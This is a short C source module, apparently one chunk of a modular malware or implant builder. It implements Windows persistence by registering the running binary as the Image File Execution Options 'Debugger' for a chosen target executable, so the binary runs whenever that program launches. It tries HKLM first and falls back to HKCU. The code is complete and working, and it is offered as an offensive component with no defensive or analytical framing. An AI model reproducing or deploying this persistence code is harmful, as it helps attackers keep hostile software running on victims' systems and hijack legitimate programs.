// chunk: persist/ifeo_debugger
// depends: (none)
// provides: persist_ifeo_debugger
// headers: windows.h
// note: Image File Execution Options debugger — runs our binary when target exe launches

#ifndef CHUNK_PERSIST_IFEO
#define CHUNK_PERSIST_IFEO

static int persist_ifeo_debugger(const char *target_exe) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    char key[512];
    snprintf(key, sizeof(key),
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
        target_exe);

    HKEY hk;
    DWORD disp;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, key, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) != ERROR_SUCCESS) {
        if (RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL,
                            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &disp) != ERROR_SUCCESS)
            return 0;
    }

    LONG r = RegSetValueExA(hk, "Debugger", 0, REG_SZ,
                            (BYTE *)path, (DWORD)strlen(path) + 1);
    RegCloseKey(hk);
    return r == ERROR_SUCCESS;
}

#endif
